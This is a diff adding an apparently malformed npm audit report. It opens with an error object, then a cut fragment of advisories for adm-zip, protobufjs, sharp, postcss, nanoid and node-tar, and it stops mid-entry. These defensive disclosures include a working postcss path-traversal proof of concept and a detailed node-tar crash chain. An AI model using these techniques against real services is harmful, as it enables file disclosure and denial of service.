@@ -1,0 +1,989 @@
+{
+  "error": {
+    "code": "ENOTFOUND",
+    "message": "request to https://registry.npmjs.org/-/npm/v1/security/audits/quick failed, reason: getaddrinfo ENOTFOUND registry.npmjs.org"
+  }
+}
+nxruntime-node>adm-zip"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2026-39244\n- https://github.com/cthackers/adm-zip/issues/568\n- https://github.com/cthackers/adm-zip/commit/2450dcf417aa29df49270237d18c5245794da3e2\n- https://github.com/cthackers/adm-zip/releases\n- https://github.com/advisories/GHSA-xcpc-8h2w-3j85",
+      "created": "2026-07-10T18:32:19.000Z",
+      "id": 1123686,
+      "npm_advisory_id": null,
+      "overview": "adm-zip before 0.5.18 is vulnerable to denial of service via a crafted ZIP file with a manipulated uncompressed size header field. In zipEntry.js line 103, Buffer.alloc(_centralHeader.size) allocates memory based on the declared uncompressed size from the ZIP central directory header without validating it against the actual compressed data size or imposing any upper bound. The size value is read directly from the binary header at entryHeader.js line 266 with no bounds check. An attacker can craft a ~120-byte ZIP file that declares ~4GB uncompressed size, causing a memory allocation amplification ratio of over 33 million to 1. The allocation occurs before CRC validation, so the malicious payload cannot be rejected early. All extraction and read methods are affected: readFile(), readAsText(), extractEntryTo(), extractAllTo(), extractAllToAsync(), test(), and entry.getData(). Any application accepting untrusted ZIP files via adm-zip is vulnerable to immediate process crash.",
+      "reported_by": null,
+      "title": "adm-zip: Crafted ZIP file triggers 4GB memory allocation",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-39244"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "adm-zip",
+      "vulnerable_versions": "<0.6.0",
+      "github_advisory_id": "GHSA-xcpc-8h2w-3j85",
+      "recommendation": "Upgrade to version 0.6.0 or later",
+      "patched_versions": ">=0.6.0",
+      "updated": "2026-07-17T21:50:10.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-400",
+        "CWE-789"
+      ],
+      "url": "https://github.com/advisories/GHSA-xcpc-8h2w-3j85"
+    },
+    "1123964": {
+      "findings": [
+        {
+          "version": "7.6.4",
+          "paths": [
+            "apps__macos>@huggingface/transformers>onnxruntime-web>protobufjs"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/protobufjs/protobuf.js/security/advisories/GHSA-j3f2-48v5-ccww\n- https://nvd.nist.gov/vuln/detail/CVE-2026-59877\n- https://github.com/protobufjs/protobuf.js/pull/2352\n- https://github.com/protobufjs/protobuf.js/commit/10fba6d54815ceecca8a06b9a6db490c8f5d2217\n- https://github.com/protobufjs/protobuf.js/commit/fa5c73add738ceb471e74da8cc2f3727c3d0a69f\n- https://github.com/protobufjs/protobuf.js/releases/tag/protobufjs-v7.6.5\n- https://github.com/protobufjs/protobuf.js/releases/tag/protobufjs-v8.6.6\n- https://github.com/advisories/GHSA-j3f2-48v5-ccww",
+      "created": "2026-07-20T22:03:00.000Z",
+      "id": 1123964,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\nprotobufjs parsed option names by advancing through schema tokens until it reached an `=` token, without checking for end of input. A crafted `.proto` schema that opens an option declaration but ends prematurely could cause the option parser to loop without ever terminating.\n\nThis affects the reflection parsing path (`parse`, `Root.load`, `Root.loadSync`).\n\n## Impact\n\nAn attacker who can provide or influence `.proto` schema text parsed by an application may be able to cause the parsing call to never return. Because Node.js is single-threaded, the blocked event loop prevents all other work in the process, resulting in a denial of service that persists until the process is externally terminated.\n\nApplications that only encode or decode protobuf binary data with trusted schemas are not directly affected.\n\n## Preconditions\n\n- The application must parse `.proto` schema text influenced by an attacker.\n- The schema must be parsed through APIs such as `parse`, `Root.load`, or `Root.loadSync`.\n- The crafted input must begin an option declaration that ends before its `=` assignment.\n\n## Workarounds\n\nDo not parse `.proto` schemas from untrusted sources with affected versions. If untrusted schema text must be accepted, isolate parsing in a process or worker that can be safely terminated and bound it with a timeout, so a non-returning parse call cannot deny service to the rest of the application.",
+      "reported_by": null,
+      "title": "protobufjs: Denial of Service via infinite loop in .proto option parsing",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-59877"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "protobufjs",
+      "vulnerable_versions": ">=7.5.0 <=7.6.4",
+      "github_advisory_id": "GHSA-j3f2-48v5-ccww",
+      "recommendation": "Upgrade to version 7.6.5 or later",
+      "patched_versions": ">=7.6.5",
+      "updated": "2026-07-20T22:03:01.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-835"
+      ],
+      "url": "https://github.com/advisories/GHSA-j3f2-48v5-ccww"
+    },
+    "1124066": {
+      "findings": [
+        {
+          "version": "0.34.5",
+          "paths": [
+            "apps__macos>@huggingface/transformers>sharp"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/libvips/libvips/security/advisories/GHSA-2fcj-gj27-279x\n- https://github.com/libvips/libvips/security/advisories/GHSA-523x-vhfw-6r76\n- https://github.com/libvips/libvips/security/advisories/GHSA-jmwm-wc68-mhwm\n- https://github.com/libvips/libvips/security/advisories/GHSA-r98w-4fp7-m9c7\n- https://github.com/lovell/sharp/security/advisories/GHSA-f88m-g3jw-g9cj\n- https://github.com/advisories/GHSA-f88m-g3jw-g9cj",
+      "created": "2026-07-21T22:07:17.000Z",
+      "id": 1124066,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nA number of vulnerabilities, two rated as \"High\" severity using CVSSv4, have been discovered and fixed in the upstream libvips dependency.\n\nThose processing untrusted input with versions of sharp prior to 0.35.0 are affected.\n\n### Patches\n\n#### Using prebuilt binaries provided by sharp?\n\nMost people rely on the prebuilt binaries provided by sharp.\n\nPlease upgrade sharp to the latest version, currently 0.35.3, which provides libvips 8.18.3.\n\n#### Using a globally-installed libvips?\n\nPlease ensure you are using the latest libvips 8.18.3.\n\n### Workarounds\nAdd the following to your code to prevent sharp from decoding GIF, TIFF and VIPS images.\n```js\nsharp.block({ operation: [\"VipsForeignLoadNsgif\", \"VipsForeignLoadTiff\", \"VipsForeignLoadVips\"] });\n```",
+      "reported_by": null,
+      "title": "sharp inherited vulnerabilities in libvips: CVE-2026-33327, CVE-2026-33328, CVE-2026-35590, CVE-2026-35591",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "high",
+      "module_name": "sharp",
+      "vulnerable_versions": "<0.35.0",
+      "github_advisory_id": "GHSA-f88m-g3jw-g9cj",
+      "recommendation": "Upgrade to version 0.35.0 or later",
+      "patched_versions": ">=0.35.0",
+      "updated": "2026-07-21T22:07:18.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-1395"
+      ],
+      "url": "https://github.com/advisories/GHSA-f88m-g3jw-g9cj"
+    },
+    "1130709": {
+      "findings": [
+        {
+          "version": "8.5.15",
+          "paths": [
+            "packages__ui>vue>@vue/compiler-sfc>postcss"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/postcss/postcss/security/advisories/GHSA-fxqj-rqcc-2cmp\n- https://github.com/postcss/postcss/commit/7beca139e70f9075c6b19700fcb00dd8033e5da8\n- https://github.com/postcss/postcss/releases/tag/8.5.19\n- https://github.com/advisories/GHSA-fxqj-rqcc-2cmp",
+      "created": "2026-08-03T17:11:39.000Z",
+      "id": 1130709,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\nThe fix for GHSA-6g55-p6wh-862q added a guard in `lib/previous-map.js` `PreviousMap.loadFile()` that restricts an attacker-controlled `sourceMappingURL` (from a CSS comment) to a `.map` extension and, for untrusted maps, rejects `..` traversal and absolute paths. The traversal/absolute rejection is nested inside `if (cssFile) { ... }`. When PostCSS is invoked without the `from` option, `cssFile` is falsy and that branch is skipped, leaving only the `.map` extension check.\n\n`PreviousMap` is constructed by `lib/input.js` whenever `pathAvailable && sourceMapAvailable` (under Node with source-map available), independent of `opts.from`/`opts.map` (the constructor returns early only for `opts.map === false`). So `postcss([]).process(css)` on attacker CSS reaches `loadFile` with `cssFile` undefined, and an attacker `/*# sourceMappingURL=/abs/path/x.map */` (or `../`-traversing path) is read via `readFileSync`. When the file is valid JSON, its `sources` (filesystem paths) and `sourcesContent` (source contents) are disclosed in the generated source map.\n\n## Affected code (v8.5.22 — the release carrying the GHSA-6g55 fix)\n\n```js\n// lib/previous-map.js\nloadFile(path, cssFile, trusted) {\n  if (!trusted && !this.unsafeMap) {\n    if (!/\\.map$/i.test(path)) {\n      return undefined\n    }\n    if (cssFile) {                       // guard runs ONLY when `from` is set\n      let relativePath = relative(dirname(cssFile), path)\n      if (relativePath === '..' ||\n          relativePath.startsWith('..' + sep) ||\n          isAbsolute(relativePath)) {\n        return undefined\n      }\n    }\n  }\n  this.root = dirname(path)\n  if (existsSync(path)) {\n    this.mapFile = path\n    return readFileSync(path, 'utf-8').toString().trim()   // sink\n  }\n}\n\n// loadMap(): untrusted annotation path, trusted=false; file === opts.from\n} else if (this.annotation) {\n  let map = this.annotation\n  if (file) map = join(dirname(file), map)   // no `from` -> map stays the raw URL\n  let unknown = this.loadFile(map, file, false)  // file undefined -> cssFile falsy\n```\n\n## Proof of concept (verified on postcss 8.5.22)\n\n```js\nconst postcss = require('postcss')\nconst fs = require('fs')\n\n// a 'secret' sourcemap OUTSIDE any expected tree (stand-in for another project's .map)\nconst secret = '/tmp/pcpoc/secret_out_of_tree.map'\nfs.writeFileSync(secret, JSON.stringify({\n  version: 3, sources: ['/etc/REAL_PATH_LEAK'], mappings: '', names: [],\n  sourcesContent: ['TOP_SECRET_abcdef']\n}))\n\nconst css = 'a{color:red}\\n/*# sourceMappingURL=' + secret + ' */'\nconst leaks = m => m && JSON.stringify(m.toJSON ? m.toJSON() : m).includes('TOP_SECRET_abcdef')\n\n;(async () => {\n  // A) NO `from`  -> guard skipped -> arbitrary absolute .map read + disclosed\n  const a = await postcss([]).process(css, { map: true })\n  console.log('no from   -> leaked:', !!leaks(a.map))   // true\n\n  // B) WITH `from` -> guard active -> blocked\n  const b = await postcss([]).process(css, { from: '/tmp/pcpoc/in.css', map: true })\n  console.log('with from -> leaked:', !!leaks(b.map))    // false\n})()\n```\n\nObserved output on postcss 8.5.22:\n\n```\nno from   -> leaked: true      # sourcesContent 'TOP_SECRET_abcdef' AND sources '/etc/REAL_PATH_LEAK' appear in result.map\nwith from -> leaked: false     # guard rejects the absolute path\n```\n\n`../` traversal (no `from`) also succeeds; non-`.map` targets (`.txt`, `?x=.map`, `#.map`) are blocked by the `.map` check. The tested build contains the GHSA-6g55 fix (`this.json = JSON.parse(...)` in `loadMap`, `consumer()` uses `this.json || this.text`), so this is a residual of that fix.\n\n## Impact\n\nArbitrary `.map`-file read (absolute path or `../` traversal) and disclosure of the target map's `sources` (local filesystem paths) and `sourcesContent` (source) into the generated source map, for any consumer that runs PostCSS on attacker-influenced CSS without a `from` option and exposes `result.map` (online CSS playgrounds, minify/lint services, string-input build steps). Bounded to files ending in `.map` that parse as JSON.\n\n## Suggested fix\n\nApply the traversal/absolute-path rejection to the untrusted map path regardless of whether `cssFile` is present (resolve against `process.cwd()` when there is no `cssFile`, and reject absolute paths and `..` escape in all untrusted cases), or refuse to load an untrusted external map when no base file is known.",
+      "reported_by": null,
+      "title": "PostCSS: incomplete fix of GHSA-6g55-p6wh-862q — attacker-controlled sourceMappingURL reads arbitrary .map files when `from` is unset",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-69153"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "postcss",
+      "vulnerable_versions": "<=8.5.22",
+      "github_advisory_id": "GHSA-fxqj-rqcc-2cmp",
+      "recommendation": "Upgrade to version 8.5.23 or later",
+      "patched_versions": ">=8.5.23",
+      "updated": "2026-08-03T17:11:40.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-22",
+        "CWE-200"
+      ],
+      "url": "https://github.com/advisories/GHSA-fxqj-rqcc-2cmp"
+    },
+    "1138811": {
+      "findings": [
+        {
+          "version": "3.3.15",
+          "paths": [
+            "packages__ui>vue>@vue/compiler-sfc>postcss>nanoid"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2026-67214\n- https://github.com/ai/nanoid/commit/6ccc67bbaba71d3d77a21d9b636f4171a268ce49\n- https://github.com/ai/nanoid/releases/tag/5.1.16\n- https://www.vulncheck.com/advisories/nanoid-before-infinite-loop-via-negative-size-in-non-secure-module\n- https://github.com/ai/nanoid/pull/600\n- https://github.com/ai/nanoid/pull/601\n- https://github.com/ai/nanoid/commit/e835c9b71eab832bc6106944bdd26ea96cf2c66d\n- https://github.com/advisories/GHSA-28wg-ghj8-5hjv",
+      "created": "2026-07-29T15:31:12.000Z",
+      "id": 1138811,
+      "npm_advisory_id": null,
+      "overview": "nanoid (Nano ID) before 5.1.16 contains an infinite loop in the customAlphabet and nanoid functions of its non-secure module (nanoid/non-secure). When these functions are given a negative size, the loop counter is decremented from a negative value and never reaches its termination condition, spinning indefinitely and hanging the calling thread. An application that passes an unvalidated, attacker-controlled negative size to these functions is exposed to a denial-of-service condition.",
+      "reported_by": null,
+      "title": "nanoid: non-secure generators can loop indefinitely with negative size",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-67214"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "nanoid",
+      "vulnerable_versions": "<3.3.16",
+      "github_advisory_id": "GHSA-28wg-ghj8-5hjv",
+      "recommendation": "Upgrade to version 3.3.16 or later",
+      "patched_versions": ">=3.3.16",
+      "updated": "2026-08-07T20:53:01.000Z",
+      "cvss": {
+        "score": 5.9,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-835"
+      ],
+      "url": "https://github.com/advisories/GHSA-28wg-ghj8-5hjv"
+    },
+    "1139427": {
+      "findings": [
+        {
+          "version": "3.3.15",
+          "paths": [
+            "packages__ui>vue>@vue/compiler-sfc>postcss>nanoid"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2026-67213\n- https://github.com/ai/nanoid/commit/cb3626d0f3342fdf179cd425fd9c4fbb92c7d0e7\n- https://github.com/ai/nanoid/releases/tag/5.1.6\n- https://www.vulncheck.com/advisories/nanoid-before-infinite-loop-via-zero-size-in-customalphabet-and-customrandom\n- https://github.com/ai/nanoid/commit/f9d13f150847d117877adee3460a46eceb0cf49b\n- https://github.com/ai/nanoid/releases/tag/3.3.17\n- https://github.com/ai/nanoid/commit/e10f8d40ce9d1ab47f66d65a16b48086432730d0\n- https://github.com/ai/nanoid/releases/tag/3.3.18\n- https://github.com/advisories/GHSA-2v37-7h3g-55p8",
+      "created": "2026-07-29T15:31:12.000Z",
+      "id": 1139427,
+      "npm_advisory_id": null,
+      "overview": "nanoid (Nano ID) before 5.1.6 contains an infinite loop in the customAlphabet and customRandom functions. When these functions are configured with a size of 0, the internal generation loop never satisfies its exit condition and spins indefinitely, hanging the calling thread. An application that passes an unvalidated, attacker-controlled size of 0 to these functions is exposed to a denial-of-service condition.",
+      "reported_by": null,
+      "title": "nanoid: custom generators can loop indefinitely when size is zero",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-67213"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "nanoid",
+      "vulnerable_versions": "<3.3.18",
+      "github_advisory_id": "GHSA-2v37-7h3g-55p8",
+      "recommendation": "Upgrade to version 3.3.18 or later",
+      "patched_versions": ">=3.3.18",
+      "updated": "2026-08-13T15:43:02.000Z",
+      "cvss": {
+        "score": 5.9,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-835"
+      ],
+      "url": "https://github.com/advisories/GHSA-2v37-7h3g-55p8"
+    },
+    "1139510": {
+      "findings": [
+        {
+          "version": "8.5.15",
+          "paths": [
+            "packages__ui>vue>@vue/compiler-sfc>postcss"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/postcss/postcss/security/advisories/GHSA-r28c-9q8g-f849\n- https://github.com/postcss/postcss/commit/95663d3eb7ba26f4854dd19d3b4f4425760cf56c\n- https://github.com/postcss/postcss/releases/tag/8.5.18\n- https://github.com/advisories/GHSA-r28c-9q8g-f849",
+      "created": "2026-07-24T16:24:55.000Z",
+      "id": 1139510,
+      "npm_advisory_id": null,
+      "overview": "## Vulnerability Details\n\n**File**: `lib/previous-map.js`\n**Line**: 87-98 (`loadFile`), 129-144 (`loadMap`)\n\n\n### Root Cause\nPostCSS auto-detects a `/*# sourceMappingURL=... */` comment inside the CSS text it is asked to parse and, unless the caller explicitly passes `map: false`, attempts to load that path from disk as a \"previous source map.\" This happens on every `postcss.parse()` / `postcss().process()` call by default (opt-out, not opt-in).\n\n`loadMap()` builds the candidate path via `join(dirname(opts.from), annotation)`, where `annotation` is the raw, attacker-controlled string from the CSS comment. `path.join()` normalizes but does not sandbox `..` segments, so a `../../../` prefix walks the resolved path outside the intended directory. If `opts.from` is not set at all, the annotation is used completely unmodified — an absolute path in the CSS comment is read verbatim.\n\n8.5.12 already fixed a strictly worse variant of this (any file, any extension, could be read) by requiring the resolved path to end in `.map` (`loadFile()`). That fix did not address the traversal itself, only the target extension. Since the `join(dirname(file), map)` logic has existed unchanged since PostCSS 8.0.0 (Feb 2020), any file ending in `.map` remains readable through this path in the current release (8.5.16).\n\nOnce loaded, `MapGenerator.isMap()` treats the mere presence of a loaded \"previous map\" as an implicit request to generate `result.map`, even when the caller never set the `map` option. If the loaded map has a `sourcesContent` field (common for maps emitted by bundlers/transpilers), that content is merged into `result.map` and returned to the caller — disclosing the traversed-to file's content to whoever supplied the CSS.\n\n### Attack Scenario\n1. A service accepts user-submitted CSS and runs it through PostCSS to lint/format/transform it, e.g. `postcss().process(userCss, { from: '/app/uploads/user123/input.css', to: '/app/uploads/user123/output.css' })` — idiomatic usage; `map` option untouched.\n2. Attacker submits CSS containing `/*# sourceMappingURL=../../../../some/other/app/dist/bundle.js.map */` (or an absolute path if `from` is unset).\n3. PostCSS reads that `.map` file and folds its `sourcesContent` into `result.map`.\n4. The service does what most build pipelines do with a truthy `result.map` — writes it next to the CSS output or returns it via API (source maps are meant to be consumed by browser devtools, so this is commonly public/served).\n5. Attacker retrieves the emitted map and reads out the traversed file's content.\n\n### Impact\nDisclosure of the contents of arbitrary `.map` files reachable via path traversal (or absolute path when `from` is unset) from the process's filesystem. Affects any application processing CSS it does not fully trust without explicitly passing `map: false`. No authentication or user interaction beyond submitting CSS text is required.\n\n### Vulnerable Code\n```js\nloadFile(path, cssFile, trusted) {\n  if (!trusted && !this.unsafeMap) {\n    if (!/\\.map$/i.test(path)) {\n      return undefined\n    }\n  }\n  this.root = dirname(path)\n  if (existsSync(path)) {\n    this.mapFile = path\n    return readFileSync(path, 'utf-8').toString().trim()\n  }\n}\n\nloadMap(file, prev) {\n  ...\n  } else if (this.annotation) {\n    let map = this.annotation\n    if (file) map = join(dirname(file), map)\n    let unknown = this.loadFile(map, file, false)\n    ...\n  }\n}\n```\n\n### Recommended Fix\nConstrain the resolved path to remain inside the CSS file's own directory instead of relying solely on a filename-extension check:\n```js\nloadFile(path, cssFile, trusted) {\n  if (!trusted && !this.unsafeMap) {\n    if (!/\\.map$/i.test(path)) {\n      return undefined\n    }\n    if (!cssFile) return undefined\n    let root = resolve(dirname(cssFile))\n    let resolvedPath = resolve(root, path)\n    if (resolvedPath !== root && !resolvedPath.startsWith(root + sep)) {\n      return undefined\n    }\n  }\n  this.root = dirname(path)\n  if (existsSync(path)) {\n    this.mapFile = path\n    return readFileSync(path, 'utf-8').toString().trim()\n  }\n}\n```\nI've implemented, tested (full existing test suite — 660/660 passing, plus new PoC-based regression checks for both the traversal and legitimate same-directory cases), and can share this fix on request or via a private fork if invited.\n\n### Verification\nDynamically confirmed on v8.5.16 (current npm release / repo HEAD) via a standalone Node.js harness against `lib/postcss.js`: a \"secret\" `.map` file placed two directories outside a simulated project directory was read via a crafted `sourceMappingURL` comment in otherwise-innocuous CSS, with its `sourcesContent` appearing verbatim in `result.map.toString()` — with no `map` option set by the caller. A second harness confirmed the simpler no-`from` case reads an absolute path directly. A third harness confirmed `map: false` is the only current workaround. The attached fix branch closes both vectors while keeping all 660 existing unit tests green.",
+      "reported_by": null,
+      "title": "PostCSS: Path Traversal in Previous Source Map Auto-Loading (sourceMappingURL) leads to Arbitrary .map File Disclosure",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-73646"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "postcss",
+      "vulnerable_versions": "<=8.5.17",
+      "github_advisory_id": "GHSA-r28c-9q8g-f849",
+      "recommendation": "Upgrade to version 8.5.18 or later",
+      "patched_versions": ">=8.5.18",
+      "updated": "2026-08-13T17:55:56.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
+      },
+      "cwe": [
+        "CWE-22"
+      ],
+      "url": "https://github.com/advisories/GHSA-r28c-9q8g-f849"
+    },
+    "1145647": {
+      "findings": [
+        {
+          "version": "7.5.19",
+          "paths": [
+            "apps__macos>node-llama-cpp>cmake-js>tar"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/isaacs/node-tar/security/advisories/GHSA-r292-9mhp-454m\n- https://github.com/isaacs/node-tar/commit/631ae59121bf8fc8a22bbae35f074cb9b789cd4a\n- https://github.com/isaacs/node-tar/releases/tag/v7.5.21\n- https://nvd.nist.gov/vuln/detail/CVE-2026-73566\n- https://github.com/advisories/GHSA-r292-9mhp-454m",
+      "created": "2026-07-24T16:26:16.000Z",
+      "id": 1145647,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n`node-tar` (npm `tar`) contains an uncontrolled-recursion stack-exhaustion DoS in the internal `mapHas` helper used by `filesFilter`. When a consumer calls `tar.t(...)` or `tar.x(...)` with a non-empty member-selection list, node-tar installs a filter that closes over the recursive `mapHas` (`src/list.ts:33-44`). `mapHas` walks an entry path upward one `path.dirname()` call per recursion **with no segment cap**. A single crafted tar with a GNU-`L` (or PAX-`x`) long-path header can deliver a path of tens of thousands of `/`-separated segments (up to `maxMetaEntrySize` = 1 MiB). The recursion overflows the call stack, throwing an uncatchable `RangeError` that terminates the Node process on async/streaming consumers.\n\n## Root Cause\n`filesFilter` (`src/list.ts:27-51`) is installed whenever a caller passes a member-selection list (`src/list.ts:119-122`, `src/extract.ts:55-57`). Its filter is invoked at `src/parse.ts:253` (`entry.ignore = entry.ignore || !this.filter(entry.path, entry)`) inside `Parser[CONSUMEHEADER]` — and crucially **outside** the only try/catch in that method (which wraps `new Header` at `src/parse.ts:179-183`). `mapHas` recurses once per path segment with no depth limit. The `Unpack` `maxDepth` guard (`src/unpack.ts:342`, in `[CHECKPATH]`) only runs on the `'entry'` event, which fires *after* `CONSUMEHEADER` has already invoked the filter — so the stack overflows before any depth guard executes. `tar.t` (list) has no `maxDepth` at all.\n\n## Impact\nUnauthenticated, remotely-triggerable denial of service: a ~188-byte gzip (≈26 KB tar) crashes any service that lists or extracts *selected members* from an untrusted archive (package registries, CI artifact/cache restore, upload processors). On async (`await tar.t(...)`/`tar.x(...)`) and streaming/`pipe` consumers the `RangeError` escapes the promise as an `uncaughtException` and terminates the process — standard defensive `try/catch` around the async call does NOT prevent it. (The synchronous API is catchable; the async/stream paths — the dominant server pattern — are not.)\n\n## Proof of Concept\n```js\n// Build a tar whose single entry has a GNU-L long path of ~12,000 \"a/\" segments (~26 KB),\n// gzip it (≈188 bytes), then have a consumer list/extract with member selection:\nconst tar = require('tar');\nawait tar.t({ file: 'evil.tar.gz', gzip: true }, ['some-member']); // -> RangeError, process exit\n```\nEmpirically reproduced on Node v24.18.0 against built `dist/commonjs` of node-tar 7.5.20: 188-byte gzip → 26,112-byte tar (12,000 segments) → uncaught `RangeError: Maximum call stack size exceeded` → process exit. A control run with no member-selection list (filter not installed) parses cleanly (exit 0), isolating `mapHas` as the sole cause.\n\n## Attack Chain\n1. **Entry.** Attacker crafts a tar with a GNU `L` (or PAX `x`) long-path header whose body is `\"a/\"`×~12000 (~26 KB), followed by a normal file entry.\n   - **Guard:** `maxMetaEntrySize` caps the meta body at 1 MiB (`src/parse.ts:241`).\n   - **Bypass proof:** 26 KB ≪ 1 MiB → accepted (verified: 26 KB archive parsed up to the filter).\n2. **Trigger.** Victim service calls `tar.t({file},[sel])` or `tar.x({file,cwd},[sel])` (member selection — a documented, common API).\n   - **Guard:** `Unpack.maxDepth` (default 1024) at `src/unpack.ts:342`; decompression-ratio guard.\n   - **Bypass proof:** `maxDepth` lives in `[CHECKPATH]` on the `'entry'` event, which fires *after* `CONSUMEHEADER`'s filter call — the crash occurs before it (extract exits 1 with default maxDepth). `tar.t` has no maxDepth. Ratio is ~139× (trivial); no total-bytes cap applies to the uncompressed meta body.\n3. **Sink.** `this.filter(entry.path)` → `mapHas` recurses once per `/` segment (`src/list.ts:39`).\n   - **Guard:** try/catch in `CONSUMEHEADER`.\n   - **Bypass proof:** the only try/catch wraps `new Header` (`src/parse.ts:179-183`); the `this.filter(...)` call at `src/parse.ts:253` is outside it. The `RangeError` propagates out of the stream write/`'data'` path → uncaught exception (verified: `process.on('uncaughtException')` fires; async `await`+`try/catch` does NOT intercept).\n4. **Impact.** Node process termination; a 188-byte gzip crashes any consumer that lists/extracts selected members from untrusted archives.\n\n## Bypass Evidence\n- `mapHas` recursion is member-name-independent: the crash fires even when the requested members do not match the malicious entry path — the attacker only needs the consumer to *use* member selection.\n- Standalone `mapHas` overflows at 20k–30k segments; on the real streaming path (atop `write → CONSUMECHUNK → CONSUMEHEADER → filter`) it crashes at ≤8k segments (finder's ~12k estimate is accurate for the reachable path).\n- Control (no member list → no filter) parses cleanly (exit 0), isolating `mapHas`.\n\n## Affected Versions\n`<= 7.5.20` (npm `tar`). `mapHas` present verbatim on tag `v7.5.20` (latest GitHub release and npm `dist-tag latest`); no segment/depth cap in `src/list.ts` or the `CONSUMEHEADER` filter path; HEAD == 7.5.20, no unreleased fix.\n\n## Suggested Fix\nRewrite `mapHas` iteratively (walk `dirname` in a `while` loop with a segment/visited cap), or enforce a hard path-segment limit in `Header`/`Parser` independent of `maxMetaEntrySize`, applied before any per-entry filter runs.\n\n## Dedup Note\nDistinct from CVE-2024-28863 / GHSA-f5x3-32g6-qm9j \"lack of folders depth validation\" (that bounds `mkdir` recursion during *extraction* via `maxDepth` in `Unpack[CHECKPATH]` on the `'entry'` event — a different sink, code path, and fix; runs after the filter and does not apply to `tar.t`). Also distinct from the PAX NUL/numeric-path crash advisories (improper-input-to-fs / type confusion, not recursion) and the gzip-bomb advisory (resource exhaustion on disk writes). None touch `list.ts`/`filesFilter`/`mapHas` or require member selection.\n\n---\nReported by **zx (Jace)** — GitHub: @manus-use",
+      "reported_by": null,
+      "title": "node-tar: Uncontrolled recursion in mapHas/filesFilter allows uncatchable stack-overflow DoS via crafted long-path tar with member selection",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-73566"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "tar",
+      "vulnerable_versions": "<=7.5.20",
+      "github_advisory_id": "GHSA-r292-9mhp-454m",
+      "recommendation": "Upgrade to version 7.5.21 or later",
+      "patched_versions": ">=7.5.21",
+      "updated": "2026-08-21T19:08:23.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-400",
+        "CWE-674"
+      ],
+      "url": "https://github.com/advisories/GHSA-r292-9mhp-454m"
+    },
+    "1193725": {
+      "findings": [
+        {
+          "version": "0.34.5",
+          "paths": [
+            "apps__macos>@huggingface/transformers>sharp"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/lovell/sharp/security/advisories/GHSA-rgj7-g3m4-5g8c\n- https://github.com/strukturag/libheif/security/advisories/GHSA-2jg2-4ch7-h545\n- https://github.com/strukturag/libheif/security/advisories/GHSA-g89c-p67h-r497\n- https://github.com/lovell/sharp/releases/tag/v0.35.4\n- https://github.com/advisories/GHSA-rgj7-g3m4-5g8c",
+      "created": "2026-09-08T21:25:11.000Z",
+      "id": 1193725,
+      "npm_advisory_id": null,
